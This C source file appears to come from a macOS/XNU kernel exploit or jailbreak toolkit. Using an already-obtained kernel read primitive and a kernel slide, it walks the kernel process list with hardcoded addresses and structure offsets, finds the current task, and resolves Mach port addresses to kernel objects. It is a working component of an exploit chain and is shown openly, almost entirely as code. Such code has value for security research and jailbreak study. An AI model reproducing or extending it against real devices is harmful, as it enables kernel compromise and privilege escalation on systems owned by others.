#include "find_port.h"
#include "krw.h"

uint64_t proc_of_pid(pid_t pid) {

    uint64_t kernproc = 0xFFFFFF8000E16DF8 + kslide;
    uint64_t proc = kread64(kernproc);
    
    uint32_t off_p_pid = 0x60;  // p/x offsetof(struct proc, p_pid)
    uint32_t off_p_list_le_prev = 0x8;  // p/x offsetof(struct proc, p_list.le_prev)

    while (1) {
        if(kread32(proc + off_p_pid) == pid) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    
    return 0;
}

uint64_t task_self_addr() {
    uint64_t proc = proc_of_pid(getpid());

    uint32_t off_p_task = 0x10; // p/x offsetof(struct proc, task)
    uint64_t task = kread64(proc + off_p_task);
    return task;
}

uint64_t find_port_via_kmem_read(mach_port_name_t port) {
    uint64_t task_addr = task_self_addr();
    
    uint32_t off_task_itk_space = 0x300;    // p/x offsetof(struct task, itk_space)
    uint64_t itk_space = kread64(task_addr + off_task_itk_space);
    
    uint32_t off_ipc_space_is_table = 0x18; // p/x offsetof(struct ipc_space, is_table)
    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
  }

uint64_t find_port_address(mach_port_t port) {
    return find_port_via_kmem_read(port);
}

uint64_t port_to_kobject(mach_port_t port)
{
    uint64_t ipc_port = find_port_address(port);
    uint64_t kobject = kread64(ipc_port + 0x68);    // 0x68 = p/x offsetof(ipc_port, kdata.kobject)
    return kobject;
} 